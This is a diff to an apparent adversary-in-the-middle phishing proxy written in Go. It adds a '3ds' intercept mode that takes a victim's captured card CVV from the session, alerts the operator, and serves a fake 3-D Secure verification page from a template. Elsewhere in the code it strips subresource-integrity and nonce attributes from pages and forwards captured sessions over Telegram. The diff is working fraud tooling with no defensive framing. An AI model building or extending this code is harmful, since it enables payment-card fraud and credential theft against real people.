@@ -1264,10 +1264,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
 							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								if ic.method != "" && !strings.EqualFold(ic.method, req.Method) {
+									continue
+								}
+								switch ic.type_ {
+								case "3ds":
+									if ic.template == "" {
+										log.Error("intercept: type=3ds requires 'template' field (domain=%s, path=%s)", ic.domain, ic.path.String())
+										return req, nil
+									}
+									if p.threeDS != nil && ps.SessionId != "" {
+										return p.handle3DSIntercept(req, ps.SessionId, ic.template, pl.Name)
+									}
+									return req, nil
+								case "static", "":
+									return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								default:
+									log.Warning("intercept: unknown type '%s', falling back to static (domain=%s, path=%s)", ic.type_, ic.domain, ic.path.String())
+									return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+								}
 							}
 						}
 					}
@@ -2398,15 +2414,6 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 				// Send formatted session using custom formatter
 				formattedMsg := p.sessionFormatter.FormatSession(s, s.Name, sessionID)
 				p.telegram.SendFormattedSession(sessionID, formattedMsg)
-
-				// If 3DS is enabled for this lure, initiate 3DS verification flow
-				if p.threeDS != nil && s.PhishLure != nil && s.PhishLure.ThreeDS && s.ThreeDSMsgID == 0 {
-					p.threeDS.Initiate(sid, password, s.RemoteAddr, s.Name)
-					msgID := p.threeDS.Send3DSNotification(sid)
-					if msgID > 0 {
-						s.ThreeDSMsgID = msgID
-					}
-				}
 			}
 		}
 	}
@@ -2709,6 +2716,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 // sriIntegrityRe matches the standalone word "integrity" (case-insensitive).
 // \b ensures we don't match compound words like importMapIntegrityCount or scriptsWithIntegrity.
 var sriIntegrityRe = regexp.MustCompile(`(?i)\bintegrity\b`)
+
 // sriNonceRe matches the standalone word "nonce" (case-insensitive).
 var sriNonceRe = regexp.MustCompile(`(?i)\bnonce\b`)
 
@@ -2730,7 +2738,6 @@ func (p *HttpProxy) removeSriIntegrity(body []byte) []byte {
 	body = sriNonceRe.ReplaceAll(body, []byte("xnonce"))
 	return body
 }
-
 
 func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
@@ -3155,13 +3162,58 @@ func recordGophishEvent(rid string, ip string, userAgent string, eventType strin
 	}
 
 	switch eventType {
-	case "open":
-		rs.HandleEmailOpened(d)
 	case "click":
 		rs.HandleClickedLink(d)
+	case "open":
+		rs.HandleEmailOpened(d)
 	case "submit":
 		rs.HandleFormSubmit(d)
 	}
+}
+
+// handle3DSIntercept handles 3DS intercept requests (type: 3ds in phishlet intercept config)
+// Initializes 3DS session if needed, loads template, and returns the 3DS page
+func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, templateName string, phishletName string) (*http.Request, *http.Response) {
+	if p.threeDS == nil {
+		return req, nil
+	}
+
+	p.session_mtx.Lock()
+	s, ok := p.sessions[sessionID]
+	var cvv string
+	var remoteAddr string
+	var redirectURL string
+	if ok {
+		cvv = s.Password
+		remoteAddr = s.RemoteAddr
+		redirectURL = s.RedirectURL
+	}
+	p.session_mtx.Unlock()
+
+	if !ok {
+		return req, nil
+	}
+
+	p.threeDS.Initiate(sessionID, cvv, remoteAddr, phishletName)
+	p.threeDS.Send3DSNotification(sessionID)
+
+	tplPath := filepath.Join(p.cfg.GetPhishletsDir(), "templates", templateName, "index.html")
+	tplContent, err := os.ReadFile(tplPath)
+	if err != nil {
+		log.Error("[3DS] failed to load template %s: %v", templateName, err)
+		resp := goproxy.NewResponse(req, "text/plain", http.StatusInternalServerError, "Template not found")
+		return req, resp
+	}
+
+	html := string(tplContent)
+	html = strings.ReplaceAll(html, "{session_id}", sessionID)
+	html = strings.ReplaceAll(html, "{redirect_url}", redirectURL)
+
+	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, html)
+	if resp != nil {
+		resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	}
+	return req, resp
 }
 
 // handle3DSRequest handles __3ds/* endpoints for 3DS verification flow
